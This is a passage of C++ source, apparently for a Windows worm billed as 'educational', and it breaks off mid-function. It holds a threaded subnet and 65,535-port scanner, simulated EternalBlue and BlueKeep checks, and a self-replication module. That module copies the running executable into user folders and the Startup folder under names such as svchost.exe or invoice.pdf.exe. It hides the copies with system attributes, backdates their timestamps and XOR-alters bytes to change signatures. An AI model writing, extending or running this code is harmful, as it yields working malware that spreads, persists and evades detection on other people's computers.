#define _WINSOCK_DEPRECATED_NO_WARNINGS 
#define WIN32_LEAN_AND_MEAN 
#define NOMINMAX
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <ws2tcpip.h>
#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <ctime>
#include <cstdlib>
#include <algorithm>
#include <set>
#include <queue>
#include <future>
#include <functional>
#include <stdexcept>
#include <random> // For std::mt19937 and std::uniform_int_distribution
#include <chrono> // For std::chrono
#include <sstream> // For std::stringstream
#include <iomanip> // For std::hex


#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

// ==========================================
// CONSTANTS
// ==========================================
const int DEFAULT_SCAN_TIMEOUT_MS = 100;
const int FULL_SCAN_TIMEOUT_MS = 50;
const int MAX_SUBNET_SCAN_THREADS = 100; // For subnet scanning
const int MAX_FULL_SCAN_THREADS = 200; // For full port scanning on a single host
const int BUFFER_SIZE = 512;

// Worm replication constants
#define MAX_REPLICATIONS 10        // Safety limit: maximum copies to create
#define MAX_PATH_LENGTH 260        // Windows max path length
#define MAX_FILE_SIZE 104857600    // 100MB max file size

// ==========================================
// STRUCT DEFINITIONS
// ==========================================

struct Target {
    std::string ip;
    int port;
    std::string service;
};

struct Vulnerability {
    std::string ip;
    int port;
    std::string service;
    std::string vulnerability_name;
    std::string cve_id;
    bool is_exploitable;
};

// ==========================================
// RAII WINSOCK INITIALIZER
// ==========================================
class WinSockInitializer {
public:
    WinSockInitializer() : initialized(false) {
        WSADATA wsaData;
        int result = WSAStartup(MAKEWORD(2, 2), &wsaData);

        if (result != 0) {
            std::cerr << "WSAStartup failed with error: " << result << std::endl;
            if (result == WSASYSNOTREADY) {
                std::cerr << "  -> Network stack not ready" << std::endl;
            } else if (result == WSAVERNOTSUPPORTED) {
                std::cerr << "  -> Winsock version not supported" << std::endl;
            }
            return;
        }

        if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2) {
            std::cerr << "Winsock 2.2 not available" << std::endl;
            WSACleanup();
            return;
        }
        initialized = true;
    }

    ~WinSockInitializer() {
        if (initialized) {
            WSACleanup();
        }
    }

    bool is_initialized() const { return initialized; }

private:
    bool initialized;
};

// Global static instance to ensure Winsock is initialized once
static WinSockInitializer g_winsock_initializer;

// ==========================================
// RAII SOCKET WRAPPER
// ==========================================
class Socket {
public:
    Socket() : sock(INVALID_SOCKET) {
        if (!g_winsock_initializer.is_initialized()) {
            throw std::runtime_error("Winsock not initialized.");
        }
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            throw std::runtime_error("Failed to create socket: " + std::to_string(WSAGetLastError()));
        }
    }

    ~Socket() {
        close();
    }

    // Disable copy and assignment
    Socket(const Socket&) = delete;
    Socket& operator=(const Socket&) = delete;

    // Move constructor and assignment
    Socket(Socket&& other) noexcept : sock(other.sock) {
        other.sock = INVALID_SOCKET;
    }

    Socket& operator=(Socket&& other) noexcept {
        if (this != &other) {
            close();
            sock = other.sock;
            other.sock = INVALID_SOCKET;
        }
        return *this;
    }

    bool connect_nb(const std::string& ip, int port, int timeout_ms) {
        sockaddr_in target_addr{};
        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(static_cast<u_short>(port));

        // Use inet_pton for modern IP address conversion
        if (InetPtonA(AF_INET, ip.c_str(), &target_addr.sin_addr) != 1) {
            // Fallback to inet_addr for simplicity if InetPton fails (e.g., older systems or malformed IP)
            target_addr.sin_addr.s_addr = inet_addr(ip.c_str());
            if (target_addr.sin_addr.s_addr == INADDR_NONE && ip != "255.255.255.255") {
                // Handle actual error if not broadcast address
                return false;
            }
        }

        // Set socket to non-blocking mode
        u_long mode = 1;
        if (ioctlsocket(sock, FIONBIO, &mode) != 0) {
            return false;
        }

        // Attempt to connect
        int connect_result = connect(sock, reinterpret_cast<sockaddr*>(&target_addr), sizeof(target_addr));
        if (connect_result == SOCKET_ERROR) {
            int error = WSAGetLastError();
            if (error != WSAEWOULDBLOCK) {
                // Actual connection error
                return false;
            }
        } else if (connect_result == 0) {
            // Connection completed immediately (rare for remote hosts)
            return true;
        }

        // Connection is in progress, use select to wait for completion
        fd_set write_set;
        FD_ZERO(&write_set);
        FD_SET(sock, &write_set);

        timeval tv;
        tv.tv_sec = timeout_ms / 1000;
        tv.tv_usec = (timeout_ms % 1000) * 1000;

        int select_result = select(0, NULL, &write_set, NULL, &tv);

        // Reset socket to blocking mode (optional, but good practice if not always non-blocking)
        mode = 0;
        ioctlsocket(sock, FIONBIO, &mode);

        if (select_result > 0) {
            // Socket is writable, check for connection error
            int opt_val;
            int opt_len = sizeof(opt_val);
            if (getsockopt(sock, SOL_SOCKET, SO_ERROR, reinterpret_cast<char*>(&opt_val), &opt_len) == 0) {
                return opt_val == 0; // Connection successful if SO_ERROR is 0
            }
        }
        return false;
    }

    int send_data(const char* data, int len) {
        return send(sock, data, len, 0);
    }

    int recv_data(char* buffer, int len) {
        return recv(sock, buffer, len, 0);
    }

    void close() {
        if (sock != INVALID_SOCKET) {
            closesocket(sock);
            sock = INVALID_SOCKET;
        }
    }

    SOCKET get_handle() const { return sock; }

private:
    SOCKET sock;
};

// ==========================================
// RAII FILE HANDLE WRAPPER
// ==========================================
class FileHandle {
public:
    FileHandle() : hFile(INVALID_HANDLE_VALUE) {}
    FileHandle(HANDLE handle) : hFile(handle) {}

    ~FileHandle() {
        close();
    }

    // Disable copy and assignment
    FileHandle(const FileHandle&) = delete;
    FileHandle& operator=(const FileHandle&) = delete;

    // Move constructor and assignment
    FileHandle(FileHandle&& other) noexcept : hFile(other.hFile) {
        other.hFile = INVALID_HANDLE_VALUE;
    }

    FileHandle& operator=(FileHandle&& other) noexcept {
        if (this != &other) {
            close();
            hFile = other.hFile;
            other.hFile = INVALID_HANDLE_VALUE;
        }
        return *this;
    }

    void close() {
        if (hFile != INVALID_HANDLE_VALUE) {
            CloseHandle(hFile);
            hFile = INVALID_HANDLE_VALUE;
        }
    }

    operator HANDLE() const { return hFile; }
    bool is_valid() const { return hFile != INVALID_HANDLE_VALUE; }

private:
    HANDLE hFile;
};

// ==========================================
// THREAD POOL
// ==========================================
class ThreadPool {
public:
    ThreadPool(size_t num_threads) : stop(false) {
        if (num_threads == 0) {
            throw std::invalid_argument("Number of threads cannot be zero.");
        }
        for (size_t i = 0; i < num_threads; ++i) {
            workers.emplace_back(
                [this] {
                    for (;;) {
                        std::function<void()> task;
                        {
                            std::unique_lock<std::mutex> lock(this->queue_mutex);
                            this->condition.wait(lock, [this] { return this->stop || !this->tasks.empty(); });
                            if (this->stop && this->tasks.empty()) {
                                return;
                            }
                            task = std::move(this->tasks.front());
                            this->tasks.pop();
                        }
                        task();
                    }
                }
            );
        }
    }

    template<class F, class... Args>
    auto enqueue(F&& f, Args&&... args) -> std::future<typename std::result_of<F(Args...)>::type> {
        using return_type = typename std::result_of<F(Args...)>::type;

        auto task = std::make_shared<std::packaged_task<return_type()>>(
            std::bind(std::forward<F>(f), std::forward<Args>(args)...)
        );

        std::future<return_type> res = task->get_future();
        {
            std::unique_lock<std::mutex> lock(queue_mutex);
            if (stop) {
                throw std::runtime_error("enqueue on stopped ThreadPool");
            }
            tasks.emplace([task]() { (*task)(); });
        }
        condition.notify_one();
        return res;
    }

    ~ThreadPool() {
        { // Scope for lock
            std::unique_lock<std::mutex> lock(queue_mutex);
            stop = true;
        }
        condition.notify_all();
        for (std::thread& worker : workers) {
            worker.join();
        }
    }

private:
    std::vector<std::thread> workers;
    std::queue<std::function<void()>> tasks;
    std::mutex queue_mutex;
    std::condition_variable condition;
    bool stop;
};

// ==========================================
// HELPER FUNCTIONS
// ==========================================

std::string guess_service(int port) {
    switch(port) {
        case 21: return "FTP";
        case 22: return "SSH";
        case 23: return "Telnet";
        case 25: return "SMTP";
        case 53: return "DNS";
        case 80: return "HTTP";
        case 110: return "POP3";
        case 135: return "RPC";
        case 139: return "NetBIOS";
        case 143: return "IMAP";
        case 443: return "HTTPS";
        case 445: return "SMB";
        case 993: return "IMAPS";
        case 995: return "POP3S";
        case 1433: return "MSSQL";
        case 3306: return "MySQL";
        case 3389: return "RDP";
        case 5432: return "PostgreSQL";
        case 5900: return "VNC";
        case 8080: return "HTTP-Alt";
        default: return "unknown";
    }
}

// Case-insensitive string comparison for Windows
int stricmp_custom(const char* s1, const char* s2) {
    return _stricmp(s1, s2);
}

// ==========================================
// VULNERABILITY CHECK FUNCTIONS (SIMULATED)
// ==========================================

bool is_smb_vulnerable(const std::string& ip) {
    try {
        Socket sock;
        if (!sock.connect_nb(ip, 445, DEFAULT_SCAN_TIMEOUT_MS)) {
            return false;
        }

        unsigned char smb_request[] = {
            0x00, 0x00, 0x00, 0x54, 0xFF, 0x53, 0x4D, 0x42,
            0x72, 0x00, 0x00, 0x00, 0x00, 0x18, 0x53, 0xC8
        };
        if (sock.send_data(reinterpret_cast<const char*>(smb_request), sizeof(smb_request)) == SOCKET_ERROR) {
            return false;
        }

        char response[BUFFER_SIZE];
        int received = sock.recv_data(response, sizeof(response));
        return (received > 0);
    } catch (const std::runtime_error& e) {
        std::cerr << "Error in is_smb_vulnerable: " << e.what() << std::endl;
        return false;
    }
}

bool is_rdp_vulnerable(const std::string& ip) {
    try {
        Socket sock;
        if (!sock.connect_nb(ip, 3389, DEFAULT_SCAN_TIMEOUT_MS)) {
            return false;
        }

        unsigned char rdp_request[] = {
            0x03, 0x00, 0x00, 0x13, 0x0E, 0xE0, 0x00, 0x00
        };
        if (sock.send_data(reinterpret_cast<const char*>(rdp_request), sizeof(rdp_request)) == SOCKET_ERROR) {
            return false;
        }

        char response[BUFFER_SIZE];
        int received = sock.recv_data(response, sizeof(response));
        return (received > 0);
    } catch (const std::runtime_error& e) {
        std::cerr << "Error in is_rdp_vulnerable: " << e.what() << std::endl;
        return false;
    }
}

bool is_netbios_vulnerable(const std::string& ip) {
    try {
        Socket sock;
        return sock.connect_nb(ip, 139, DEFAULT_SCAN_TIMEOUT_MS);
    } catch (const std::runtime_error& e) {
        std::cerr << "Error in is_netbios_vulnerable: " << e.what() << std::endl;
        return false;
    }
}

bool is_web_vulnerable(const std::string& ip, int port) {
    try {
        Socket sock;
        if (!sock.connect_nb(ip, port, DEFAULT_SCAN_TIMEOUT_MS)) {
            return false;
        }

        std::string http_request = "HEAD / HTTP/1.1\r\nHost: " + ip + "\r\nConnection: close\r\n\r\n";
        if (sock.send_data(http_request.c_str(), static_cast<int>(http_request.length())) == SOCKET_ERROR) {
            return false;
        }

        char response[BUFFER_SIZE];
        int received = sock.recv_data(response, sizeof(response) - 1);
        if (received == SOCKET_ERROR) {
            return false;
        }
        response[received] = '\0'; // Null-terminate the received data

        std::string response_str(response);
        if (response_str.find("Server: Apache/2.2") != std::string::npos ||
            response_str.find("Server: Microsoft-IIS/6.0") != std::string::npos ||
            response_str.find("Server: nginx/0.7") != std::string::npos) {
            return true;
        }

        return false;
    } catch (const std::runtime_error& e) {
        std::cerr << "Error in is_web_vulnerable: " << e.what() << std::endl;
        return false;
    }
}

std::vector<Vulnerability> check_vulnerabilities(const std::vector<Target>& open_ports) {
    std::vector<Vulnerability> vulnerable_targets;
    std::mutex vuln_mutex;

    std::cout << "\n[PHASE 3] Vulnerability Assessment" << std::endl;
    std::cout << "=================================" << std::endl;

    ThreadPool vuln_check_pool(std::thread::hardware_concurrency() > 0 ? std::thread::hardware_concurrency() : 4);
    std::vector<std::future<void>> futures;

    for (const Target& target : open_ports) {
        futures.emplace_back(vuln_check_pool.enqueue([&, target]() {
            if (target.port == 445 && target.service == "SMB") {
                if (is_smb_vulnerable(target.ip)) {
                    std::lock_guard<std::mutex> lock(vuln_mutex);
                    Vulnerability vuln;
                    vuln.ip = target.ip;
                    vuln.port = 445;
                    vuln.service = "SMB";
                    vuln.vulnerability_name = "EternalBlue (simulated)";
                    vuln.cve_id = "CVE-2017-0144 (simulated)";
                    vuln.is_exploitable = true;
                    vulnerable_targets.push_back(vuln);
                    std::cout << "[!!!] CRITICAL: " << target.ip << " has VULNERABLE SMB!" << std::endl;
                }
            }
            else if (target.port == 3389 && target.service == "RDP") {
                if (is_rdp_vulnerable(target.ip)) {
                    std::lock_guard<std::mutex> lock(vuln_mutex);
                    Vulnerability vuln;
                    vuln.ip = target.ip;
                    vuln.port = 3389;
                    vuln.service = "RDP";
                    vuln.vulnerability_name = "BlueKeep vulnerability (simulated)";
                    vuln.cve_id = "CVE-2019-0708 (simulated)";
                    vuln.is_exploitable = true;
                    vulnerable_targets.push_back(vuln);
                    std::cout << "[!!!] CRITICAL: " << target.ip << " has VULNERABLE RDP!" << std::endl;
                }
            }
            else if (target.port == 139 && target.service == "NetBIOS") {
                if (is_netbios_vulnerable(target.ip)) {
                    std::lock_guard<std::mutex> lock(vuln_mutex);
                    Vulnerability vuln;
                    vuln.ip = target.ip;
                    vuln.port = 139;
                    vuln.service = "NetBIOS";
                    vuln.vulnerability_name = "NetBIOS information disclosure (simulated)";
                    vuln.cve_id = "CVE-2000-0979 (simulated)";
                    vuln.is_exploitable = true;
                    vulnerable_targets.push_back(vuln);
                    std::cout << "[!] " << target.ip << " has VULNERABLE NetBIOS" << std::endl;
                }
            }
            else if ((target.port == 80 || target.port == 443) && (target.service == "HTTP" || target.service == "HTTPS" || target.service == "HTTP-Alt")) {
                if (is_web_vulnerable(target.ip, target.port)) {
                    std::lock_guard<std::mutex> lock(vuln_mutex);
                    Vulnerability vuln;
                    vuln.ip = target.ip;
                    vuln.port = target.port;
                    vuln.service = target.service;
                    vuln.vulnerability_name = "Web server vulnerability (simulated)";
                    vuln.cve_id = "CVE-2021-XXXX (simulated)";
                    vuln.is_exploitable = true;
                    vulnerable_targets.push_back(vuln);
                    std::cout << "[!] " << target.ip << ":" << target.port << " has WEB vulnerability" << std::endl;
                }
            }
        }));
    }

    for (auto& future : futures) {
        future.get();
    }
    
    std::cout << "\n[*] Found " << vulnerable_targets.size() << " exploitable targets" << std::endl;
    return vulnerable_targets;
}

// ==========================================
// NETWORK SCANNER CLASS
// ==========================================

class NetworkScanner {
public:
    NetworkScanner() : subnet_pool(MAX_SUBNET_SCAN_THREADS), full_scan_pool(MAX_FULL_SCAN_THREADS) {}

    // Main smart scan function
    std::vector<Target> worm_smart_scan(const std::string& subnet_prefix) {
        std::vector<Target> all_targets;
        std::mutex all_targets_mutex;

        std::cout << "[Phase 1] Quick scan: 20 common ports on 254 hosts" << std::endl;
        std::vector<int> common_ports = {
            21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 
            443, 445, 993, 995, 1433, 3306, 3389, 5432, 5900, 8080
        };
        
        std::vector<std::future<std::vector<Target>>> quick_scan_futures;
        for (int i = 1; i <= 254; ++i) {
            std::string ip = subnet_prefix + "." + std::to_string(i);
            quick_scan_futures.emplace_back(subnet_pool.enqueue(
                [this, ip, common_ports]() { return scan_ports_on_host(ip, common_ports, DEFAULT_SCAN_TIMEOUT_MS); }
            ));
        }

        std::set<std::string> interesting_ips;
        for (auto& future : quick_scan_futures) {
            std::vector<Target> host_targets = future.get();
            std::lock_guard<std::mutex> lock(all_targets_mutex);
            for (const Target& t : host_targets) {
                all_targets.push_back(t);
                interesting_ips.insert(t.ip);
                std::cout << "[+] " << t.ip << ":" << t.port << " (" << t.service << ")" << std::endl;
            }
        }

        std::cout << "[Phase 2] Deep scan: Full port scan on " << interesting_ips.size() << " interesting hosts" << std::endl;
        
        std::vector<std::future<std::vector<Target>>> deep_scan_futures;
        for (const std::string& ip : interesting_ips) {
            deep_scan_futures.emplace_back(full_scan_pool.enqueue(
                [this, ip]() { return full_port_scan_single(ip); }
            ));
        }

        for (auto& future : deep_scan_futures) {
            std::vector<Target> host_targets = future.get();
            std::lock_guard<std::mutex> lock(all_targets_mutex);
            all_targets.insert(all_targets.end(), host_targets.begin(), host_targets.end());
        }
        
        return all_targets;
    }

private:
    ThreadPool subnet_pool;
    ThreadPool full_scan_pool;

    std::vector<Target> scan_ports_on_host(const std::string& ip, const std::vector<int>& ports, int timeout_ms) {
        std::vector<Target> open_ports;
        for (int port : ports) {
            try {
                Socket sock;
                if (sock.connect_nb(ip, port, timeout_ms)) {
                    Target t;
                    t.ip = ip;
                    t.port = port;
                    t.service = guess_service(port);
                    open_ports.push_back(t);
                }
            } catch (const std::runtime_error& e) {
                // Log socket creation errors, but don't stop scanning
                // std::cerr << "Socket error for " << ip << ":" << port << ": " << e.what() << std::endl;
            }
        }
        return open_ports;
    }

    std::vector<Target> full_port_scan_single(const std::string& ip) {
        std::vector<Target> open_ports;
        std::mutex open_ports_mutex;
        std::cout << "[*] Deep scanning " << ip << " (all 65535 ports)..." << std::endl;

        std::vector<std::future<void>> futures;
        for (int port = 1; port <= 65535; ++port) {
            futures.emplace_back(full_scan_pool.enqueue([&, ip, port]() {
                try {
                    Socket sock;
                    if (sock.connect_nb(ip, port, FULL_SCAN_TIMEOUT_MS)) {
                        std::lock_guard<std::mutex> lock(open_ports_mutex);
                        Target t;
                        t.ip = ip;
                        t.port = port;
                        t.service = guess_service(port);
                        open_ports.push_back(t);
                        std::cout << "     " << ip << ":" << port << " OPEN" << std::endl;
                    }
                } catch (const std::runtime_error& e) {
                    // Log socket creation errors, but don't stop scanning
                    // std::cerr << "Socket error for " << ip << ":" << port << ": " << e.what() << std::endl;
                }
            }));

            if (port % 1000 == 0) {
                std::cout << "     " << ip << " - " << port << "/65535 ports checked" << std::endl;
            }
        }

        for (auto& future : futures) {
            future.get();
        }
        return open_ports;
    }
};

// ==========================================
// WORM REPLICATION MODULE
// ==========================================

class WormReplication {
private:
    std::string worm_name;                    // Name of the worm executable
    int replication_count;                     // Counter for copies made
    std::vector<std::string> replication_log; // Log of where copies were placed
    std::mt19937 rng;                          // Mersenne Twister random number generator

public:
    std::vector<char> worm_buffer;
    DWORD worm_size;
    WormReplication(const char* name = "educational_worm.exe") :
        worm_name(name),
        replication_count(0),
        worm_size(0),
        rng(static_cast<unsigned int>(std::chrono::high_resolution_clock::now().time_since_epoch().count()))
    {
        if (read_self()) {
            std::cout << "[+] Worm initialized successfully. Size: " << worm_size << " bytes\n";
        } else {
            std::cout << "[-] Failed to initialize worm - cannot read self\n";
        }
    }

    // No explicit destructor needed for std::vector<char>

    /**
     * Read the current executable file with better error handling
     * @return true if successful, false otherwise
     */
    bool read_self() {
        char self_path_c[MAX_PATH_LENGTH];
        DWORD path_len = GetModuleFileNameA(NULL, self_path_c, MAX_PATH_LENGTH);
        std::string self_path(self_path_c);

        if (path_len == 0) {
            std::cerr << "[-] Failed to get executable path (Error: " << GetLastError() << ")\n";
            return false;
        } else if (path_len >= MAX_PATH_LENGTH) {
            std::cerr << "[-] Executable path truncated (MAX_PATH_LENGTH exceeded)" << std::endl;
            return false;
        }
        
        std::cout << "[*] Reading from: " << self_path << "\n";
        
        FileHandle self_file(CreateFileA(
            self_path.c_str(),
            GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        ));
        
        if (!self_file.is_valid()) {
            std::cerr << "[-] Error opening self: " << GetLastError() << "\n";
            return false;
        }
        
        LARGE_INTEGER file_size;
        if (!GetFileSizeEx(self_file, &file_size)) {
            std::cerr << "[-] Failed to get file size (Error: " << GetLastError() << ")\n";
            return false;
        }
        
        if (file_size.QuadPart > MAX_FILE_SIZE) {
            std::cerr << "[-] File too large: " << file_size.QuadPart << " bytes (max: " << MAX_FILE_SIZE << ")\n";
            return false;
        }
        
        worm_size = static_cast<DWORD>(file_size.QuadPart);
        worm_buffer.resize(worm_size);
        
        DWORD total_read = 0;
        DWORD bytes_read = 0;
        
        while (total_read < worm_size) {
            if (!ReadFile(self_file, worm_buffer.data() + total_read, 
                         worm_size - total_read, &bytes_read, NULL)) {
                std::cerr << "[-] Error reading self at position " << total_read << " (Error: " << GetLastError() << ")\n";
                worm_buffer.clear();
                worm_size = 0;
                return false;
            }
            
            if (bytes_read == 0) break; // End of file reached
            total_read += bytes_read;
        }
        
        if (total_read != worm_size) {
            std::cerr << "[-] Incomplete read: " << total_read << "/" << worm_size << " bytes\n";
            worm_buffer.clear();
            worm_size = 0;
            return false;
        }
        
        return true;
    }
    
    /**
     * Generate a unique filename to avoid overwriting existing files
     * @param directory: Target directory path
     * @return Complete path with unique filename
     */
    std::string generate_unique_filename(const std::string& directory) {
        std::uniform_int_distribution<> dist_int;
        std::uniform_int_distribution<int> dist_strategy(0, 4);
        std::string full_path_str;
        int attempts = 0;
        const int MAX_ATTEMPTS = 10;
        
        while (attempts < MAX_ATTEMPTS) {
            int strategy = dist_strategy(rng);
            std::stringstream ss;
            
            switch(strategy) {
                case 0: {  // Legitimate-looking system name
                    const char* legit_names[] = {
                        "svchost.exe", "winlogon.exe", "services.exe", 
                        "lsass.exe", "csrss.exe", "spoolsv.exe",
                        "dwm.exe", "explorer.exe", "taskmgr.exe"
                    };
                    ss << directory << "\\" << legit_names[dist_int(rng) % 9];
                    break;
                }
                case 1: {  // Random name with system prefix
                    ss << directory << "\\sys_" << dist_int(rng) % 10000 << "_" << dist_int(rng) % 10000 << ".exe";
                    break;
                }
                case 2: {  // Hidden file with dot prefix
                    ss << directory << "\\." << worm_name.substr(0, worm_name.find('.')) << "_" << std::hex << dist_int(rng) << ".exe";
                    break;
                }
                case 3: {  // Legitimate document name + double extension
                    const char* doc_names[] = {
                        "document.pdf.exe", "photo.jpg.exe", "readme.txt.exe",
                        "report.docx.exe", "data.xls.exe", "config.ini.exe",
                        "invoice.pdf.exe", "resume.doc.exe"
                    };
                    ss << directory << "\\" << doc_names[dist_int(rng) % 8];
                    break;
                }
                case 4: {  // Timestamp-based name
                    ss << directory << "\\update_" << std::chrono::duration_cast<std::chrono::seconds>(
                        std::chrono::system_clock::now().time_since_epoch()).count() << ".exe";
                    break;
                }
            }
            full_path_str = ss.str();
            
            // Check if file already exists
            DWORD attrs = GetFileAttributesA(full_path_str.c_str());
            if (attrs == INVALID_FILE_ATTRIBUTES) {
                return full_path_str;
            }
            
            attempts++;
        }
        
        // Fallback: use timestamp + random
        std::stringstream ss_fallback;
        ss_fallback << directory << "\\sys_" << std::chrono::duration_cast<std::chrono::seconds>(
            std::chrono::system_clock::now().time_since_epoch()).count() << "_" << dist_int(rng) << ".exe";
        
        return ss_fallback.str();
    }
    
    /**
     * Get potential replication targets (directories)
     * @return Vector of target directory paths
     */
    std::vector<std::string> get_target_directories() {
        std::vector<std::string> targets;
        char path_c[MAX_PATH_LENGTH];
        
        // 1. Current directory
        if (GetCurrentDirectoryA(MAX_PATH_LENGTH, path_c) > 0) {
            targets.push_back(std::string(path_c));
        }
        
        // 2. Windows temporary directory
        if (GetTempPathA(MAX_PATH_LENGTH, path_c) > 0) {
            targets.push_back(std::string(path_c));
        }
        
        // 3. User Profile directory (e.g., C:\Users\Username)
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, path_c))) {
            targets.push_back(std::string(path_c));
        }

        // 4. Desktop directory
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, path_c))) {
            targets.push_back(std::string(path_c));
        }
        
        // 5. Documents directory
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_MYDOCUMENTS, NULL, 0, path_c))) {
            targets.push_back(std::string(path_c));
        }
        
        // 6. Downloads directory (derived from CSIDL_PERSONAL)
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, path_c))) {
            std::string downloads = std::string(path_c) + "\\..\\Downloads";
            targets.push_back(downloads);
        }
        
        // 7. Startup directory (for persistence)
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, path_c))) {
            targets.push_back(std::string(path_c));
        }
        
        // 8. AppData Roaming
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path_c))) {
            targets.push_back(std::string(path_c));
        }
        
        // 9. AppData Local
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path_c))) {
            targets.push_back(std::string(path_c));
        }
        
        // Remove duplicates and verify directories are writable
        std::vector<std::string> unique_targets;
        for (const auto& target_dir : targets) {
            // Check if already in list
            if (std::find(unique_targets.begin(), unique_targets.end(), target_dir) != unique_targets.end()) {
                continue;
            }
            
            // Check if directory exists and is actually a directory
            DWORD attrs = GetFileAttributesA(target_dir.c_str());
            if (attrs == INVALID_FILE_ATTRIBUTES) {
                continue; // Doesn't exist
            }
            
            if (!(attrs & FILE_ATTRIBUTE_DIRECTORY)) {
                continue; // Not a directory
            }
            
            // Try to create a test file to verify write access
            std::uniform_int_distribution<int> dist_int(0, 9999); // Add this line
            std::stringstream test_path_ss;
            test_path_ss << target_dir << "\\.test_" << dist_int(rng) << ".tmp";
            std::string test_path = test_path_ss.str();

            FileHandle hTest(CreateFileA(test_path.c_str(), GENERIC_WRITE, 0, NULL,
                                      CREATE_NEW, FILE_ATTRIBUTE_TEMPORARY, NULL));
            
            if (hTest.is_valid()) {
                hTest.close(); // Close immediately
                DeleteFileA(test_path.c_str());
                unique_targets.push_back(target_dir);
            }
        }
        
        return unique_targets;
    }
    
    /**
     * Check if a file is already infected (using simple size heuristic for educational purposes)
     * @param filepath: Path to check
     * @return true if likely infected
     */
    bool is_infected(const std::string& filepath) {
        DWORD attrs = GetFileAttributesA(filepath.c_str());
        if (attrs == INVALID_FILE_ATTRIBUTES) {
            return false; // File doesn't exist
        }
        
        // Check file extension (only target .exe or .scr for this worm)
        size_t dot_pos = filepath.rfind('.');
        if (dot_pos == std::string::npos) return false; // No extension
        std::string ext = filepath.substr(dot_pos);
        if (stricmp_custom(ext.c_str(), ".exe") != 0 && stricmp_custom(ext.c_str(), ".scr") != 0) {
            return false; // Not a target file type
        }
        
        FileHandle hFile(CreateFileA(filepath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL,
                                   OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL));
        if (hFile.is_valid()) {
            LARGE_INTEGER file_size_li;
            if (GetFileSizeEx(hFile, &file_size_li)) {
                DWORD file_size = static_cast<DWORD>(file_size_li.QuadPart);
                
                if (file_size == worm_size) {
                    return true; // Exact match - likely infected
                }
                
                DWORD diff = (file_size > worm_size) ? (file_size - worm_size) : (worm_size - file_size);
                double percent_diff = static_cast<double>(diff) / static_cast<double>(worm_size);
                
                if (percent_diff < 0.1) {
                    return true; // Within 10% of our size
                }
            }
        }
        
        return false;
    }
    
    /**
     * Set file attributes to hide the worm
     * @param filepath: Path to hide
     */
    void apply_stealth(const std::string& filepath) {
        DWORD attrs = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
        if (!SetFileAttributesA(filepath.c_str(), attrs)) {
            std::cerr << "    [~] Warning: Could not set hidden attributes for " << filepath << " (Error: " << GetLastError() << ")\n";
        }
        
        FileHandle hFile(CreateFileA(filepath.c_str(), GENERIC_WRITE, 0, NULL,
                                   OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL));
        if (hFile.is_valid()) {
            FILETIME ft;
            SYSTEMTIME st;
            
            st.wYear = 2020;
            st.wMonth = 1;
            st.wDay = 1;
            st.wHour = 0;
            st.wMinute = 0;
            st.wSecond = 0;
            st.wMilliseconds = 0;
            
            if (SystemTimeToFileTime(&st, &ft)) {
                if (!SetFileTime(hFile, &ft, &ft, &ft)) {
                    std::cerr << "    [~] Warning: Could not set file timestamps for " << filepath << " (Error: " << GetLastError() << ")\n";
                }
            }
        }
    }
    
    /**
     * Apply simple polymorphism to the worm code (for educational demonstration)
     * @param buffer: Buffer containing worm code
     * @param size: Size of buffer
     */
    void apply_polymorphism(std::vector<char>& buffer, DWORD size) {
        // 1. Change <unsigned char> to <int>
        std::uniform_int_distribution<int> dist_byte(0, 255);

        // 2. Cast the result to unsigned char when you get it
        unsigned char xor_key = static_cast<unsigned char>(dist_byte(rng));

        DWORD start_offset = size - std::min(size, (DWORD)1024); // Modify last 1KB or less if file is smaller
        for (DWORD i = start_offset; i < size; i++) {
            buffer[i] ^= xor_key;
        }
    }
    
    /**
     * MAIN REPLICATION FUNCTION
     * @return Number of successful replications
     */
    int replicate() {
        std::cout << "\n[*] Starting local replication process...\n";
        
        if (replication_count >= MAX_REPLICATIONS) {
            std::cout << "[!] Maximum replications (" << MAX_REPLICATIONS << ") already reached.\n";
            return 0;
        }
        
        if (worm_buffer.empty() || worm_size == 0) {
            std::cerr << "[-] Error: Worm code not loaded in memory\n";
            return 0;
        }
        
        std::vector<std::string> targets = get_target_directories();
        if (targets.empty()) {
            std::cout << "[-] No writable target directories found\n";
            return 0;
        }
        
        std::cout << "[*] Found " << targets.size() << " potential target directories\n";
        
        int success_count = 0;
        std::vector<std::string> failed_targets;
        
        for (size_t i = 0; i < targets.size(); i++) {
            const auto& target_dir = targets[i];
            
            if (replication_count >= MAX_REPLICATIONS) {
                std::cout << "[!] Stopping: Maximum replications reached\n";
                break;
            }
            
            std::cout << "\n[" << (i+1) << "/" << targets.size() << "] Attempting: " << target_dir << "\n";
            
            std::string target_path = generate_unique_filename(target_dir);
            std::cout << "    Target file: " << target_path << "\n";
            
            if (is_infected(target_path)) {
                std::cout << "    [~] Skipping: Already infected or similar file exists\n";
                continue;
            }
            
            FileHandle hTarget(CreateFileA(
                target_path.c_str(),
                GENERIC_WRITE,
                0,
                NULL,
                CREATE_NEW,
                FILE_ATTRIBUTE_NORMAL,
                NULL
            ));
            
            if (!hTarget.is_valid()) {
                DWORD error = GetLastError();
